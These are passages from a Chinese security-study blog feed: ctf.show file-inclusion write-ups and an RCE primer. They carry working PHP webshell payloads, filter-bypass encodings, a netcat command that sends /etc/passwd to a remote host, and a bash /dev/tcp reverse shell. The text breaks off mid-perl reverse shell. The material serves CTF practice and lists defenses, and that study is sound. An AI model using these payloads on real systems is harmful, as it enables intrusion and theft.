​<code>User-Agent: 222222222&lt;?php system(&#39;ls&#39;)?&gt;</code>​并发送数据包，成功写入，并被解析fl0g.php index.php</p><p> <img src="/assets/image-20240803171811-t0cj2rq.png" alt="image"><br> ​<code>User-Agent: 333333333&lt;?php system(&#39;tac fl0g.php&#39;)?&gt;</code>​并发送数据包，成功写入</p><p> <img src="/assets/image-20240803171821-zg9gy6i.png" alt="image">​</p></li><li><p>WEB—82~86—SESSION包含</p><p> <img src="/assets/image-20240803172037-z98gjoq.png" alt="image">​</p><p> 确保以下配置项在 php.ini 文件中已启用</p> <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">On</span><br></code></pre></td></tr></table></figure><p> 1、在本地创建文件上传代码如下，并将<strong>上传URL更改为对应的靶场网址</strong></p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;目标网址&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;?&gt;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p> 2、运行创建的网址，并随意上传文件，通过burp抓包，并加入<code>Cookie: PHPSESSID=wusuowei</code>​，自定义Session ID</p><p> <img src="/assets/image-20240803172323-cdt2bz3.png" alt="image">​</p><p> 3、由于<code>session.upload_progress.cleanup</code>​是开启的，<strong>一旦读取了所有POST数据，就会清除进度信息</strong>于是我们需要条件竞争来读取文件，所谓条件竞争简单来说是<strong>在执行系统命令前先执行完自己的代码</strong>。</p><ol><li><p>将上传文件的数据包发送至Intruder，选择Clear$后Playloads→Playload type:Null payloads , Payload Options →Continue indefinitely（无限发送上传文件数据包）</p><p> <img src="/assets/image-20240803172517-5it91j6.png" alt="image">​</p><p> <img src="/assets/image-20240803172527-zs4g5sd.png" alt="image">​</p></li><li><p>将访问上传文件的请求数据包抓取并发送至Intruder，选择Clear$后Playloads→Playload type:Null payloads , Payload Options →Continue indefinitely（无限发送访问请求数据包）</p><p> <a href="http://8dc5c2cc-397c-46d6-a28d-3b202ca37b6a.challenge.ctf.show/?file%5C=/tmp/sess%5C_wusuowei">http://8dc5c2cc-397c-46d6-a28d-3b202ca37b6a.challenge.ctf.show/?file\=/tmp/sess\_wusuowei</a></p><p> <img src="/assets/image-20240803172556-85pkdlq.png" alt="image">​</p><p> <img src="/assets/image-20240803172606-5cc9vzz.png" alt="image"></p></li></ol></li><li><p>WEB—87—php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</p><p> <img src="/assets/image-20240803172953-z2ns9ux.png" alt="image">​</p><p> 正常来讲，浏览器会默认执行URL解码一次，但是提供代码中又加入了一次<code>urldecode($file)</code>​，即二次解码，所以要正常执行即要进行二次url编码</p><p> 1、利用base64:</p><ol><li><p>url编码2次：<code>php://filter/write=convert.base64-decode/resource=123.php</code>​</p></li><li><p>Post data:写入<code>content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg</code>​</p></li></ol><p> 这里需要补全数位aa</p><p> <img src="/assets/image-20240803173425-ftz4xvt.png" alt="image">​</p><p> <img src="/assets/image-20240803173408-1gard0q.png" alt="image">​</p><ol start="3"><li><p><strong>解码为&lt;?php @eval($_POST[a]);?&gt;（木马设置的密码为：a）</strong></p></li><li><p>通过访问，创建<strong>木马文件123.php</strong></p></li><li><p>并通过输入Post data：写入<code>a=system(&#39;ls&#39;);</code>​（通过木马密码进行替换操作）</p><p> <img src="/assets/image-20240803173728-5rhjdgc.png" alt="image">​</p></li><li><p>并通过输入Post data：写入<code>a=system(&#39;tac fl0g.php&#39;);</code>​</p><p> <img src="/assets/image-20240803173736-gtn7u76.png" alt="image">​</p></li></ol><p> 2、利用凯撒加密</p><p> url编码2次：<code>php://filter/write=string.rot13/resource=2.php</code>​</p><p> Post data:写入<code>content=&lt;?cuc riny($_CBFG[1]);?&gt;</code>​</p><p> ROT13解密：<code>&lt;?php eval($_POST[1]);?&gt;</code>​（木马设置的密码为：1）</p><p> <img src="/assets/image-20240803173928-ow3n2g8.png" alt="image">​</p><p> 剩下的步骤一样</p></li><li><p>WEB—88—data-base64协议</p><p> <img src="/assets/image-20240803174026-jva4z73.png" alt="image">​</p><p> 过滤PHP，各种符号，php代码编码写出无符号（+和&#x3D;）base64值<br> Payload：<code>file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk</code>​<br> 解密：<code>&lt;?php system(&#39;tac *.php&#39;);echo 123;?&gt;ad</code>​ <strong>（多出的echo 123 和 ad是为了去掉+和&#x3D;）</strong><br> 直接写<code>&lt;?php system(&#39;tac *.php&#39;);?&gt;</code>​，会出现被过滤的号&#x3D;&#x3D;</p><p> <img src="/assets/image-20240803174241-lggisgm.png" alt="image">​</p></li><li><p>WEB—117—php内置过滤器</p><p> <img src="/assets/image-20240803174344-co1fb7z.png" alt="image">​</p><p> <strong>将众多编码形式做了过滤包括</strong> <strong>​<code>http</code>​</strong>​ <strong>,</strong>  <strong>​<code>https</code>​</strong>​ <strong>,</strong>  <strong>​<code>utf</code>​</strong>​ <strong>,</strong>  <strong>​<code>zlib</code>​</strong>​ <strong>,</strong>  <strong>​<code>data</code>​</strong>​ <strong>,</strong>  <strong>​<code>input</code>​</strong>​ <strong>,</strong>  <strong>​<code>rot13</code>​</strong>​ <strong>,</strong>  <strong>​<code>base64</code>​</strong>​ <strong>,</strong>  <strong>​<code>string</code>​</strong>​ <strong>,</strong>  <strong>​<code>log</code>​</strong>​ <strong>,</strong>  <strong>​<code>sess</code>​</strong>​ <strong>，不区分大小写（</strong>​<strong>​<code>i</code>​</strong>​ <strong>标志）</strong></p><p> convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</p><p> <img src="/assets/image-20240803174415-i6il0x4.png" alt="image">​</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/* 将字符串 &#x27;&lt;?php eval($_POST[a]);?&gt; 从 UCS-2LE 编码转换为 UCS-2BE 编码*/</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>, <span class="hljs-string">&quot;UCS-2BE&quot;</span>, <span class="hljs-string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;经过一次反转:&quot;</span>.<span class="hljs-variable">$result</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-comment">//经过一次反转:?&lt;hp pvela$(P_SO[T]a;)&gt;?</span><br><br><span class="hljs-comment">// 将经过一次编码转换后的字符串再次从 UCS-2LE 编码转换为 UCS-2BE 编码</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;经过第二次反转:&quot;</span>.<span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>, <span class="hljs-string">&quot;UCS-2BE&quot;</span>, <span class="hljs-variable">$result</span>);<br><span class="hljs-comment">//经过第二次反转:&lt;?php eval($_POST[a]);?&gt;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol><li><p>Payload：<code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</code>​</p></li><li><p>Post data 中写入：<code>contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?</code>​</p><p> <img src="/assets/image-20240803174632-oxk99z9.png" alt="image">​</p></li><li><p>解码为：<code>&lt;?php eval($_POST[a]);?&gt;</code>​（木马设置的密码为：a）</p></li><li><p>通过访问，创建木马文件a.php，<a href="http://e57a2227-b187-459c-8172-ed70850fee7c.challenge.ctf.show/123.php">http://e57a2227-b187-459c-8172-ed70850fee7c.challenge.ctf.show/123.php</a></p></li><li><p>并通过输入Post data：写入<code>a=system(&#39;ls&#39;);</code>​（通过木马密码进行替换操作）</p><p> <img src="/assets/image-20240803174656-or2zo5d.png" alt="image">​</p></li><li><p>并通过输入Post data：写入<code>a=system(&#39;tac flag.php&#39;);</code>​</p><p> <img src="/assets/image-20240803174705-lr47iyj.png" alt="image">​</p></li></ol></li></ol><p>‍</p><h4 id="5、临时文件包含"><a href="#5、临时文件包含" class="headerlink" title="5、临时文件包含"></a>5、临时文件包含</h4><p><a href="https://blog.csdn.net/qq_62989306/article/details/125114940">php7卡临时文件包含</a></p><p>‍</p><p>‍</p><h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含-RFI"></a>远程文件包含-RFI</h2><h3 id="无限制远程文件包含"><a href="#无限制远程文件包含" class="headerlink" title="无限制远程文件包含"></a>无限制远程文件包含</h3><p>找到对应的小皮PHP设置中的远程包含并开启或者在对应&#x3D;&#x3D;网址服务的PHP版本下找到php.ini文件，并将allow_url_include&#x3D;Off改为On即可&#x3D;&#x3D;</p><p><img src="/assets/image-20240802201949-lukl0t7.png" alt="image">​</p><p>通过远程服务，创建file.txt内容为<?php phpinfo();?> ，并使用远程包含，将对应文件地址替换为远程创建的文件的ip访问地址即可</p><p><img src="/assets/image-20240803102413-nqlm98q.png" alt="image">​</p><p><img src="/assets/image-20240803102530-1nvtmqc.png" alt="image">​</p><p>‍</p><h3 id="有限制文件包含"><a href="#有限制文件包含" class="headerlink" title="有限制文件包含"></a>有限制文件包含</h3><p><img src="/assets/image-20240803191842-o6s9dqo.png" alt="image">​</p><p>1.这里的代码比上面无限制的代码多了<code>.html</code>​</p><p>2.当我们此时再对远程文件进行文件包含的时候，就失败了。</p><h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p><strong>第一种：末尾加</strong>​<code>%20</code>​</p><p><strong>第二种：末尾加</strong>​<code>%23</code>​</p><p><strong>第三种：末尾加</strong>​<code>?</code>​</p><p><strong>第四种：</strong>​<code>%00</code>​<strong>截断（php版本&lt;5.3.4）</strong></p><p>‍</p><p>‍</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>敏感信息泄露：</p><p>攻击者可以读取服务器上任意文件或目录的内容，从而可能泄露敏感信息，例如数据库连接字符串、密码、客户数据或源代码。</p><p>任意代码执行：</p><p>如果攻击者可以提交恶意文件路径并且 Web 服务器将该文件解析为脚本，则攻击者可能会能够执行任意代码，从而可以在服务器上安装恶意软件、创建后门或发起进一步的攻击。  </p><p>‍</p><h1 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h1><p>1、使用str_replace等方法过滤掉危险字符</p><p>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</p><p>3、php版本升级，防止%00截断</p><p>4、对上传的文件进行重命名，防止被读取</p><p>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</p><p>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</p><p>‍</p><h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><p>‍</p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>WEB攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB攻防</tag>
      
      <tag>文件包含漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RCE漏洞🐛</title>
    <link href="/2024/03/26/RCE%E6%BC%8F%E6%B4%9E%F0%9F%90%9B/"/>
    <url>/2024/03/26/RCE%E6%BC%8F%E6%B4%9E%F0%9F%90%9B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://mp.weixin.qq.com/s/gtArMfC2Xq9IEpwvu8Sszg">rce宝典</a></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>在Web应用开发中为了灵活性、简洁性等会让应用<strong>调用代码执行函数或系统命令执行函数处理</strong>，若应用<strong>对用户的输入过滤不严</strong>，容易产生远程代码执行漏洞或系统命令执行漏洞</p><p>RCE漏洞，有两种执行方式，向后台服务器远程注入操作系统命令（即远程命令执行RemoteCommand Exec）或者远程代码执行（Remote Code Exec），顾名思义就是远程执行，通过上述的远程注入后，从而执行系统命令，进而控制后台系统。</p><p>‍</p><p>‍</p><p>‍</p><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>‍</p><h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><table><thead><tr><th align="center">管道符</th><th align="center">实例</th><th>描述</th></tr></thead><tbody><tr><td align="center">;</td><td align="center">A;B</td><td>无论真假，A与B都执行</td></tr><tr><td align="center">&amp;</td><td align="center">A&amp;B</td><td>无论真假，A与B都执行</td></tr><tr><td align="center">&amp;&amp;</td><td align="center">A&amp;&amp;B</td><td>A为真时才执行B，否则只执行A</td></tr><tr><td align="center">|</td><td align="center">A|B</td><td>显示B的执行结果<br /></td></tr><tr><td align="center">||</td><td align="center">A||B</td><td>A为假时才执行B，否则只执行A</td></tr><tr><td align="center">&#96;</td><td align="center">`命令`<br /></td><td>优先执行反引号内的内容，重点在于命令替换</td></tr><tr><td align="center">$</td><td align="center">$(命令)</td><td>优先执行括号内的内容，重点在于命令替换</td></tr></tbody></table><p>‍</p><h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>. ls -a 列出文件下所有的文件，包括以“.“开头的隐藏文件（linux下文件隐藏文件是以.开头的，如果存在..代表存在着父目录）。<br><span class="hljs-number">2</span>. ls -l 列出文件的详细信息，如创建者，创建时间，文件的读写权限列表等等。<br><span class="hljs-number">3</span>. ls -F 在每一个文件的末尾加上一个字符说明该文件的类型。<span class="hljs-string">&quot;@&quot;</span>表示符号链接、<span class="hljs-string">&quot;|&quot;</span>表示FIFOS、<span class="hljs-string">&quot;/&quot;</span>表示目录、<span class="hljs-string">&quot;=&quot;</span>表示套接字。<br><span class="hljs-number">4</span>. ls -s 在每个文件的后面打印出文件的大小。 <span class="hljs-title function_ invoke__">size</span>(大小)<br><span class="hljs-number">5</span>. ls -t 按时间进行文件的排序 <span class="hljs-title function_ invoke__">Time</span>(时间)<br><span class="hljs-number">6</span>. ls -A 列出除了<span class="hljs-string">&quot;.&quot;</span>和<span class="hljs-string">&quot;..&quot;</span>以外的文件。<br><span class="hljs-number">7</span>. ls -R 将目录下所有的子目录的文件都列出来，相当于我们编程中的“递归”实现<br><span class="hljs-number">8</span>. ls -L 列出文件的链接名。Link（链接）<br><span class="hljs-number">9</span>. ls -S 以文件的大小进行排序<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h1 id="如何测试"><a href="#如何测试" class="headerlink" title="如何测试"></a>如何测试</h1><p>‍</p><h2 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h2><p>思考哪些功能点会执行代码或者命令，但是这种不太常见，也可以直接利用工具帮忙探测(awvs、xray等)</p><p>‍</p><h2 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h2><p>查看相关函数</p><p>‍</p><p>‍</p><p>‍</p><h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><h3 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h3><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><ul><li><p><code>eval()</code>​：将字符串作为php代码执行；</p></li><li><p><code>assert()</code>​：将字符串作为php代码执行；</p></li><li><p><code>preg_replace+/e</code>​（php版本&lt;5.5）：正则匹配替换字符串；&#x2F;e为可执行模式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/abc/e&quot;</span>,<span class="hljs-string">&quot;<span class="hljs-subst">$_REQUEST</span>[x]&quot;</span>,<span class="hljs-string">&quot;abcd&quot;</span>); <span class="hljs-meta">?&gt;</span><br>漏洞利用：?x=<span class="hljs-title function_ invoke__">phpinfo</span>();<br>这段代码的作用是从字符串 <span class="hljs-string">&quot;abcd&quot;</span> 中找到匹配 <span class="hljs-string">&quot;abc&quot;</span> 的部分，并用用户通过请求参数 x 传递的内容来替换它。<br>由于使用了 /e 修饰符，PHP不仅仅是简单地替换字符串，还会执行传入的字符串作为PHP代码。<br></code></pre></td></tr></table></figure></li><li><p><code>create_function()</code>​（PHP 4 &gt;&#x3D; 4.0.1，PHP 5，PHP 7）：主要创建匿名函数；</p><p>create_function ( string $args , string $code )</p><p>第一个为匿名函数的参数  第二个参数为匿名函数代码。如果这个参数跟后面的代码没有任何关系那么传入啥都无所谓</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$id&#x27;</span>,<span class="hljs-variable">$_REQUEST</span>[x]);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>(<span class="hljs-string">&#x27;afssda&#x27;</span>);<br> <span class="hljs-meta">?&gt;</span><br>漏洞利用：?x=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure></li><li><p><code>call_user_func()</code>​：回调函数，第一个参数为函数名，第二个参数为函数的参数；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a1&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a2&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br>?a1=system&amp;a2=whoami <span class="hljs-comment">//命令执行</span><br>?a1=assert&amp;a2=<span class="hljs-title function_ invoke__">phpinfo</span>() <span class="hljs-comment">//代码执行</span><br></code></pre></td></tr></table></figure></li><li><p><code>call_user_func_array()</code>​：回调函数，第一个参数为函数名，第二个参数为函数参数的数组；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a1&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a2&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br>?a1=system&amp;a2[]=whoami <span class="hljs-comment">//命令执行</span><br>?a1=assert&amp;a2[]=<span class="hljs-title function_ invoke__">phpinfo</span>() <span class="hljs-comment">//代码执行</span><br></code></pre></td></tr></table></figure></li><li><p><code>array_map()</code>​：将一个回调函数应用于数组的每个元素，第一个参数为回调函数，第二个参数为数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a1&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a2&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br>?a1=system&amp;a2=[<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>] <span class="hljs-comment">//命令执行</span><br>?a1=assert&amp;a2[]=<span class="hljs-title function_ invoke__">phpinfo</span>() <span class="hljs-comment">//代码执行</span><br></code></pre></td></tr></table></figure></li><li><p><code>array_filter()</code>​：使用一个回调函数来判断数组的每个元素是否应保留在结果数组中，第一个参数为数组，第二个参数为回调函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a1&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a2&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br>?a1=[<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>]&amp;a2=system <span class="hljs-comment">//命令执行</span><br>?a1=<span class="hljs-title function_ invoke__">phpinfo</span>()&amp;a2[]=assert <span class="hljs-comment">//代码执行</span><br></code></pre></td></tr></table></figure></li><li><p><code>uasort()</code>​使用用户自定义的比较函数对数组进行排序，第一个参数为数组，第二个参数为用户自定义的比较函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">uasort</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a1&#x27;</span>],<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a2&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br>?a1=system&amp;a2=[<span class="hljs-string">&#x27;ls&#x27;</span>,<span class="hljs-string">&#x27;whoami&#x27;</span>] <span class="hljs-comment">//命令执行</span><br>?a1=assert&amp;a2[]=<span class="hljs-title function_ invoke__">phpinfo</span>() <span class="hljs-comment">//代码执行</span><br></code></pre></td></tr></table></figure></li><li><p>可变函数：<strong>PHP7</strong>前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。</p><p><img src="/assets/image-20240825160741-13f8nn4.png" alt="image">​</p></li></ul><p>‍</p><h4 id="Javascript"><a href="#Javascript" class="headerlink" title="Javascript:"></a>Javascript:</h4><ul><li>eval</li></ul><p>‍</p><h4 id="Python"><a href="#Python" class="headerlink" title="Python:"></a>Python:</h4><ul><li>exec</li></ul><p>‍</p><h4 id="Vbscript"><a href="#Vbscript" class="headerlink" title="Vbscript"></a>Vbscript</h4><ul><li>Execute</li><li>Eval</li></ul><p>‍</p><h2 id="远程命令执行"><a href="#远程命令执行" class="headerlink" title="远程命令执行"></a>远程命令执行</h2><p>系统命令执行函数<br>​<code>system()</code>​：能将字符串作为OS命令执行，且返回命令执行结果；</p><p><code>exec()</code>​：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)；</p><p><code>shell_exec()</code>​：能将字符串作为OS命令执行</p><p><code>passthru()</code>​：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上；</p><p><code>popen()</code>​：打开进程文件指针</p><p><code>proc_open()</code>​：与popen()类似</p><p><code>pcntl_exec()</code>​：在当前进程空间执行指定程序；</p><p>反引号：反引号内的字符串会被解析为OS命令；</p><p>‍</p><p>‍</p><p>‍</p><h2 id="有回显RCE"><a href="#有回显RCE" class="headerlink" title="有回显RCE"></a>有回显RCE</h2><p>直接获取系统敏感信息</p><p>Windows 操作系统</p><p><code>type c:\windows\win.ini</code>​</p><p>Linux 操作系统</p><p><code>cat /etc/passwd</code>​</p><p>‍</p><h2 id="无回显RCE"><a href="#无回显RCE" class="headerlink" title="无回显RCE"></a>无回显RCE</h2><ol><li><p>直接写个文件访问查看</p><ul><li><p>exce()无输出</p><p>可将执行结果输出到文件再访问文件执行以下命令后访问x.txt即可</p><p>ls &#x2F; | tee x.txt<br>cat &#x2F;flag | tee x.txt</p></li><li><p>eval()无输出<br>​<code>eval(print `c\at /flag`;)</code>​</p></li><li><p>使用echo直接写</p><p><img src="/assets/image-20240825144822-hhlwde7.png" alt="image">​</p><p><img src="/assets/image-20240825144834-j9ug41n.png" alt="image">​</p><p>利用管道符+echo写入shell</p><p><code>echo &quot;PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg==&quot;|base64 -d&gt;shell.php</code>​</p><p><img src="/assets/image-20240411211259-98r93ep.png" alt="image">​</p><p><img src="/assets/image-20240411211430-xoiywq8.png" alt="image">​</p><p>成功写入shell.php</p><p><img src="/assets/image-20240411211455-as2a0st.png" alt="image">​</p><p>‍</p></li></ul></li><li><p>直接进行对外访问dnslog</p><p> <img src="/assets/image-20240825144910-eyvim1h.png" alt="image">​</p><p> <img src="/assets/image-20240825144925-8d762zg.png" alt="image">​</p><p> <img src="/assets/image-20240411213111-31jnxy9.png" alt="image">​</p></li><li><p>burpsuite测试无回显</p><p> 点击这里</p><p> <img src="/assets/image-20240411214918-7nes9tf.png" alt="image">​</p><p> 然后和dnslog一样获取随机域名</p><p> <img src="/assets/image-20240411215037-aq8e62b.png" alt="image">​</p><p> 这里的做法和dnslog一样不过多赘述</p></li><li><p>使用日志测试无回显</p><p> 利用 HTTP 协议，访问 WEB 中间件时，iis 或者 apache 或者小型服务，都存在访问日志。在 kali 上开启 python的小型服务器。再用 curl 协议访问远程服务器 ip 的 80 端口，再到 kali 的终端查看记录即可。</p><p> 可以使用<code>wget</code>​或者<code>curl</code>​命令</p><p> <img src="/assets/image-20240411233926-xtrm560.png" alt="image">​</p><p> <img src="/assets/image-20240411233751-582z2qy.png" alt="image">​</p></li><li><p>netcat</p><p> 如果目标系统存在有 netcat 在 ubuntu 系统都会存在的。使用命令读取文件传递到远程服务器上</p><p> 远程服务器监听命令</p><p> <code>nc -lp 9999 &gt;passwd</code>​</p><p> <img src="/assets/image-20240411234828-0927hg0.png" alt="image">​</p><p> 本地执行命令</p><p> <code>nc 192.168.88.142 9999 &lt;/etc/passwd</code>​</p><p> <img src="/assets/image-20240411234910-b0p0xmc.png" alt="image">​</p><p> 会在查看远程服务器生成 passwd 文件</p><p> <img src="/assets/image-20240411235000-2zrdvoi.png" alt="image">​</p></li><li><p>nc反弹shell</p><p> 远程服务器 nc 监听命令</p><p> nc -vlnp 8080</p><p> 受害者反弹 shell 命令，每种语言都有 sock 连接命令，可以根据不通过的环境，选择合适的命令。</p><p> <code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</code>​</p><p> ‍</p><p> perl脚本</p> <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">perl -e <span class="hljs-string">&#x27;use 